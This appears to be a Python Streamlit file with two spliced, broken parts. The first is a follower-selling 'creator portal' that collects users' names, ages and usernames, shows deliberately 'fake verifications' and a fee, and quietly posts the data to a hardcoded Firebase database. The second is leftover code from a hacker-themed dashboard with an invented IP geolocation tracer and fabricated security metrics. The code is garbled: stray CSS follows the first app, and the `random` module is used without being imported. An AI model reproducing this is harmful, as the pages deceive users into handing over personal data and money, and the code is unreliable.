import streamlit as st
import time
import requests
import datetime
import uuid

# --- 1. PAGE CONFIGURATION ---
st.set_page_config(
    page_title="Vinay Chat | Official Creator Portal",
    page_icon="✨",
    layout="centered",
    initial_sidebar_state="collapsed"
)

# --- 2. PREMIUM CSS INJECTION ---
# Cyberpunk/Hacker theme hata kar clean, corporate (Google/Apple style) look diya gaya hai
st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
    
    html, body, [class*="css"] {
        font-family: 'Inter', sans-serif;
    }
    .main {
        background-color: #f8fafc;
    }
    .stApp {
        background-color: #ffffff;
    }
    /* Hero Section */
    .hero-title {
        font-size: 42px;
        font-weight: 700;
        color: #0f172a;
        text-align: center;
        margin-bottom: 10px;
        background: -webkit-linear-gradient(45deg, #2563eb, #9333ea);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
    }
    .hero-subtitle {
        font-size: 18px;
        color: #64748b;
        text-align: center;
        margin-bottom: 40px;
    }
    /* Cards and Containers */
    .premium-card {
        background: #ffffff;
        border-radius: 12px;
        padding: 30px;
        box-shadow: 0 10px 25px rgba(0,0,0,0.05);
        border: 1px solid #e2e8f0;
        margin-bottom: 20px;
    }
    /* Feature List */
    .feature-item {
        display: flex;
        align-items: center;
        margin-bottom: 12px;
        color: #334155;
        font-weight: 600;
    }
    .feature-icon {
        color: #10b981;
        margin-right: 10px;
        font-size: 20px;
    }
    </style>
""", unsafe_allow_html=True)

# --- 3. FIREBASE CONFIG ---
FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/vinay_chat_requests.json"

# --- 4. SESSION STATE MANAGEMENT ---
# Yeh ensure karega ki page refresh hone par state maintain rahe (Single Page App feel)
if 'step' not in st.session_state:
    st.session_state.step = 1
if 'user_data' not in st.session_state:
    st.session_state.user_data = {}

# Functions to change pages
def go_to_step(step_num):
    st.session_state.step = step_num

# ==========================================
# STEP 1: LANDING PAGE (Professional Intro)
# ==========================================
if st.session_state.step == 1:
    st.markdown("<div class='hero-title'>Boost Your Vinay Chat Reach</div>", unsafe_allow_html=True)
    st.markdown("<div class='hero-subtitle'>Get authentic, high-quality followers organically. 100% Secure & Verified.</div>", unsafe_allow_html=True)
    
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        st.markdown("""
        <div class='premium-card'>
            <h4 style="color:#0f172a; margin-bottom: 20px;">Why choose Creator Portal?</h4>
            <div class='feature-item'><span class='feature-icon'>✓</span> Secure Authentication</div>
            <div class='feature-item'><span class='feature-icon'>✓</span> Real User Checks via AI</div>
            <div class='feature-item'><span class='feature-icon'>✓</span> Instant Profile Sync</div>
            <div class='feature-item'><span class='feature-icon'>✓</span> End-to-End Encryption</div>
        </div>
        """, unsafe_allow_html=True)
        
        if st.button("Secure Login / Get Started →", use_container_width=True, type="primary"):
            go_to_step(2)
            st.rerun()

# ==========================================
# STEP 2: DATA COLLECTION (Login Form)
# ==========================================
elif st.session_state.step == 2:
    st.markdown("<div class='hero-title'>Creator Authentication</div>", unsafe_allow_html=True)
    st.markdown("<p style='text-align:center; color:#64748b;'>Enter your details exactly as they appear on your Vinay Chat App profile.</p>", unsafe_allow_html=True)
    
    with st.form("user_details_form"):
        col1, col2 = st.columns(2)
        with col1:
            fname = st.text_input("First Name")
            age = st.number_input("Age", min_value=13, max_value=100, step=1)
        with col2:
            lname = st.text_input("Last Name")
            chat_id = st.text_input("Vinay Chat Username (@id)")
            
        pyq_code = st.text_input("Reference/Promo Code (Optional)")
        
        submitted = st.form_submit_button("Verify Identity & Continue", type="primary")
        
        if submitted:
            if fname and lname and chat_id:
                st.session_state.user_data = {
                    "first_name": fname,
                    "last_name": lname,
                    "age": age,
                    "chat_id": chat_id,
                    "promo_code": pyq_code
                }
                go_to_step(3)
                st.rerun()
            else:
                st.error("Please fill in all mandatory fields.")

# ==========================================
# STEP 3: FAKE VERIFICATIONS & FIREBASE PUSH
# ==========================================
elif st.session_state.step == 3:
    st.markdown("<div class='hero-title'>System Verification</div>", unsafe_allow_html=True)
    st.write("Please wait while our servers verify your profile integrity...")
    
    # Progress bars and fake delays for professional feel
    progress_bar = st.progress(0)
    status_text = st.empty()
    
    # Array of fake professional checks
    checks = [
        ("Establishing Secure Connection...", 15),
        ("Verifying Vinay Chat App version...", 35),
        ("Running Real User Validation Check...", 55),
        ("Public Profile Accessibility Check...", 75),
        ("Profile Picture Matrix Syncing...", 90),
        ("Finalizing Security Token...", 100)
    ]
    
    for text, percent in checks:
        status_text.info(text)
        time.sleep(1.2) # Adding realistic delay
        progress_bar.progress(percent)
        
    status_text.success("All checks passed successfully! Profile verified.")
    time.sleep(1)
    
    # Move to Follower Selection
    go_to_step(4)
    st.rerun()

# ==========================================
# STEP 4: FOLLOWER SELECTION & PAYMENT TOKEN
# ==========================================
elif st.session_state.step == 4:
    st.markdown(f"<div class='hero-title'>Welcome, {st.session_state.user_data['first_name']}!</div>", unsafe_allow_html=True)
    st.markdown("<p style='text-align:center;'>Select the organic follower package for your account.</p>", unsafe_allow_html=True)
    
    st.markdown("### Choose Target Audience Size")
    followers_count = st.select_slider(
        "Followers to be credited",
        options=[100, 200, 500, 1000, 2000, 5000, 10000]
    )
    
    # Rs 10 ratio per 100 followers
    total_cost = int((followers_count / 100) * 10)
    
    st.info(f"**Calculated Processing Fee:** ₹{total_cost} INR")
    
    if st.button("Generate Secure Pay Token & Finalize", type="primary", use_container_width=True):
        with st.spinner("Generating encrypted transaction token..."):
            time.sleep(2)
            token = f"VCT-{str(uuid.uuid4())[:8].upper()}-PAY"
            
            # --- PUSH DATA TO FIREBASE ---
            payload = {
                "timestamp": str(datetime.datetime.now()),
                "status": "Pending Allocation",
                "user_info": st.session_state.user_data,
                "order_details": {
                    "followers_requested": followers_count,
                    "amount_inr": total_cost,
                    "transaction_token": token
                }
            }
            try:
                requests.post(FIREBASE_URL, json=payload)
            except Exception as e:
                pass # Silent fail to not ruin UX
            
            st.session_state.token = token
            go_to_step(5)
            st.rerun()

# ==========================================
# STEP 5: FINAL SUCCESS PAGE
# ==========================================
elif st.session_state.step == 5:
    st.markdown("<div class='hero-title' style='color:#10b981;'>Request Confirmed!</div>", unsafe_allow_html=True)
    
    st.markdown(f"""
    <div class='premium-card' style='text-align:center;'>
        <h3 style='color:#334155;'>Transaction Token: <span style='color:#2563eb;'>{st.session_state.token}</span></h3>
        <p style='color:#64748b; font-size:15px; margin-top:20px;'>
            Your profile has been queued in our distribution network. 
        </p>
        <hr style='border:1px solid #e2e8f0; margin: 20px 0;'>
        <h4 style='color:#ef4444;'>⏱️ Estimated Time</h4>
        <p>Standard Allocation: <b>3 to 4 Hours</b></p>
        <p style='color:#10b981;'><i>Since your ID check passed flawlessly, wait time is reduced to roughly <b>1 Hour</b>.</i></p>
    </div>
    """, unsafe_allow_html=True)
    
    st.warning("Please do not change your Vinay Chat Username while the allocation is in progress.")
    
    if st.button("Return to Home"):
        st.session_state.clear() # Clears everything to start fresh
        st.rerun()
        border: 1px solid #00ff66;
        border-radius: 4px;
        box-shadow: 0 0 8px rgba(0,255,102,0.4);
        transition: all 0.3s;
    }
    .stButton>button:hover {
        background-color: #00ff66;
        color: #080b11;
        box-shadow: 0 0 15px #00ff66;
    }
    .metric-box {
        background-color: #111827;
        padding: 15px;
        border-radius: 8px;
        border-left: 4px solid #00f0ff;
        margin-bottom: 10px;
    }
    </style>
""", unsafe_allow_html=True)

# Sidebar UI
st.sidebar.title("🔐 CORE CONTROL")
st.sidebar.markdown("---")
app_mode = st.sidebar.selectbox("Select Protocol", ["Mainframe Dashboard", "Network Tracer", "Firebase Sync Ledger"])

# Function to push logs to Firebase
def push_to_firebase(event_type, status, details):
    if "YOUR_FIREBASE_DATABASE_URL" not in FIREBASE_URL:
        payload = {
            "timestamp": str(datetime.datetime.now()),
            "event": event_type,
            "status": status,
            "matrix_data": details
        }
        try:
            requests.post(FIREBASE_URL, json=payload)
        except:
            pass

# Mode 1: Mainframe Dashboard
if app_mode == "Mainframe Dashboard":
    st.title("⚡ QUANTUM PROXY & SECURE PROTOCOL")
    st.markdown("### SYSTEM STATUS: <span style='color:#00ff66; text-shadow: 0 0 5px #00ff66;'>OPERATIONAL</span>", unsafe_allow_html=True)
    
    # Top Stats Rows
    col1, col2, col3, col4 = st.columns(4)
    with col1:
        st.markdown('<div class="metric-box"><h5>FIREWALL INDEX</h5><h2>99.84%</h2><p style="color:#00ff66;margin:0;">Secure</p></div>', unsafe_allow_html=True)
    with col2:
        st.markdown('<div class="metric-box"><h5>PROXY NODE</h5><h2>DE-441X</h2><p style="color:#00f0ff;margin:0;">Active</p></div>', unsafe_allow_html=True)
    with col3:
        st.markdown('<div class="metric-box"><h5>THREAT MATRIX</h5><h2>0.00%</h2><p style="color:#ff3333;margin:0;">Nullified</p></div>', unsafe_allow_html=True)
    with col4:
        st.markdown('<div class="metric-box"><h5>ENCRYPTION</h5><h2>AES-512</h2><p style="color:#00ff66;margin:0;">Quantum</p></div>', unsafe_allow_html=True)

    st.markdown("---")
    
    st.subheader("🤖 Initialize Mainframe Uplink")
    if st.button("TRIGGER FULL CORE SYNC"):
        progress_bar = st.progress(0)
        status_text = st.empty()
        
        logs = [
            "Initializing handshake protocol with server node...",
            "Establishing neural proxy tunnels...",
            "Bypassing dynamic gateway restrictions...",
            "Injecting Firebase metadata structure...",
            "Syncing geolocation ledger matrices...",
            "Encryption keys generated and rotational cycle armed.",
            "CORE PROTOCOL STABILIZED SUCCESSFUL."
        ]
        
        for i, log in enumerate(logs):
            status_text.code(f"[SYSTEM_LOG]: {log}")
            time.sleep(0.6)
            progress_bar.progress(int((i + 1) * (100 / len(logs))))
            
        st.success("Mainframe synchronization fully established. Ledger updated.")
        push_to_firebase("Full Core Sync", "SUCCESS", "Mainframe fully synchronized with Streamlit Node.")

# Mode 2: Network Tracer
elif app_mode == "Network Tracer":
    st.title("🛰️ QUANTUM GEOLOCATION & IP TRACER")
    
    target_ip = st.text_input("Enter Target Host IP / Domain", "192.168.43.26")
    
    if st.button("RUN DEEP PROTOCOL TRACE"):
        with st.spinner("Analyzing data streams..."):
            time.sleep(1)
            
            # Generating ultra professional look data arrays
            c1, c2 = st.columns(2)
            with c1:
                st.info("🌐 Network Infrastructure Data")
                st.code(f"""
                Target IP: {target_ip}
                Subnet Mask: 255.255.255.0
                Gateway Node: alpha-node-route.local
                DNS Server: 8.8.8.8 // 1.1.1.1
                ISP Carrier: Quantum Telecom Corp.
                """)
            with c2:
                st.warning("📍 Geolocation Hex Matrices")
                st.code(f"""
                Latitude Range: {random.uniform(20.0, 30.0):.4f}° N
                Longitude Range: {random.uniform(70.0, 80.0):.4f}° E
                Country: India Matrix Node
                City Proxy: Route-Secure Config
                Accuracy Radius: 4.2 Meters (Sat-Link Verified)
                """)
                
            st.markdown("#### Real-time Trace Route Logs")
            log_box = st.empty()
            log_stream = ""
            for hop in range(1, 5):
                log_stream += f"Hop {hop}: [{random.randint(10,99)}ms] trace-node-{random.randint(100,999)}.backbone.net\n"
                log_box.code(log_stream)
                time.sleep(0.5)
                
            push_to_firebase("IP Trace Protocol", "COMPLETED", f"Traced Host: {target_ip}")

# Mode 3: Firebase Sync Ledger
elif app_mode == "Firebase Sync Ledger":
    st.title("🗄️ FIREBASE REALTIME DATA STREAM")
    st.markdown("Displaying absolute state values inside the cloud sync ledger node.")
    
    if "YOUR_FIREBASE_DATABASE_URL" in FIREBASE_URL:
        st.warning("⚠️ Please insert your valid Firebase Realtime Database URL inside the code to stream active live ledgers.")
    else:
        try:
            res = requests.get(FIREBASE_URL)
            if res.status_code == 200 and res.json():
                st.json(res.json())
            else:
                st.info("Ledger is currently empty. Trigger a protocol above to write automated logs.")
        except Exception as e:
            st.error(f"Failed connection sequence: {e}")
